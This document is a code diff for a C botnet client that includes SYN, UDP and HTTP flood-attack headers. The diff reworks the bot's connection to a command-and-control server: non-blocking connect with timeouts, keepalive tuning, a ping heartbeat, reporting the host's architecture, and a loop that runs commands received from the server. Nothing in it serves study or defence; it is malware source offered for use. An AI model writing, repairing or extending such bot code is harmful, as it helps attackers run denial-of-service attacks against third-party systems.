@@ -13,6 +13,8 @@
 #include <time.h>
 #include <sys/file.h>
 #include <errno.h>
+#include <fcntl.h>
+#include <poll.h>
 #include "headers/syn_attack.h"
 #include "headers/udp_attack.h"
 #include "headers/http_attack.h"
@@ -27,10 +29,9 @@
 
 #define CNC_IP "0.0.0.0"
 #define BOT_PORT 1338
-#define MAX_THREADS 2
-// recommended 2-5 (OR 1 IF LOADING LOW-END bots)
-#define MAX_RECONNECT_ATTEMPTS 15
-#define RETRY_DELAY 5
+#define MAX_THREADS 3
+#define RETRY_DELAY 4
+#define RECV_TIMEOUT_MS 30000 //30s
 
 const char* get_arch() {
     #ifdef ARCH_aarch64
@@ -158,48 +159,82 @@ int main(int argc, char** argv) {
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(BOT_PORT);
     inet_pton(AF_INET, CNC_IP, &server_addr.sin_addr);
-    int connect_attempts = 0;
     int initial_connection = 1;
-    while (connect_attempts < MAX_RECONNECT_ATTEMPTS) {
+    int reconnect_attempts = 0;
+    while (reconnect_attempts < 10) {
         if (sock != -1) {
             close(sock);
             sock = -1;
         }
         sock = socket(AF_INET, SOCK_STREAM, 0);
+        if (sock == -1) {
+            reconnect_attempts++;
+            sleep(RETRY_DELAY);
+            continue;
+        }
         int optval = 1;
         setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));
+        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
         int keepidle = 30;
-        int keepintvl = 10; // FINALLY FIXED BOT DIES
+        int keepintvl = 10;
         int keepcnt = 3;
         setsockopt(sock, IPPROTO_TCP, TCP_KEEPIDLE, &keepidle, sizeof(keepidle));
         setsockopt(sock, IPPROTO_TCP, TCP_KEEPINTVL, &keepintvl, sizeof(keepintvl));
         setsockopt(sock, IPPROTO_TCP, TCP_KEEPCNT, &keepcnt, sizeof(optval));
         optval = 1;
         setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &optval, sizeof(optval));
-        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
+        fcntl(sock, F_SETFL, O_NONBLOCK);
+        connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
+        fd_set fdset;
+        FD_ZERO(&fdset);
+        FD_SET(sock, &fdset);
+        struct timeval tv;
+        tv.tv_sec = 5;
+        tv.tv_usec = 0;
+        if (select(sock + 1, NULL, &fdset, NULL, &tv) != 1) {
             close(sock);
             sock = -1;
-            connect_attempts++;
+            reconnect_attempts++;
             sleep(RETRY_DELAY);
             continue;
         }
-        if (initial_connection) {
-            send(sock, get_arch(), strlen(get_arch()), MSG_NOSIGNAL);
-            initial_connection = 0;
-            connect_attempts = 0; 
+        fcntl(sock, F_SETFL, fcntl(sock, F_GETFL) & ~O_NONBLOCK);
+        if (send(sock, get_arch(), strlen(get_arch()), MSG_NOSIGNAL) <= 0) {
+            close(sock);
+            sock = -1;
+            reconnect_attempts++;
+            sleep(RETRY_DELAY);
+            continue;
         }
-        while ((n = recv(sock, command, sizeof(command)-1, 0)) > 0) {
+        while (1) {
+            struct pollfd fds;
+            fds.fd = sock;
+            fds.events = POLLIN;
+            int ret = poll(&fds, 1, RECV_TIMEOUT_MS);
+            if (ret == 0) {
+                if (send(sock, "ping", 4, MSG_NOSIGNAL) <= 0) {
+                    break;
+                }
+                continue;
+            } else if (ret < 0) {
+                break;
+            }
+            n = recv(sock, command, sizeof(command)-1, 0);
+            if (n <= 0) {
+                break;
+            }
             command[n] = 0;
             handle_command(command, sock);
             memset(command, 0, sizeof(command));
         }
-        if (!initial_connection) {
-            connect_attempts++;
+        reconnect_attempts = 0;
+        initial_connection = 1;
+        if (sock != -1) {
+            close(sock);
+            sock = -1;
         }
         sleep(RETRY_DELAY);
     }
-    if (sock != -1) {
-        close(sock);
-    }
+    
     return 0;
 }
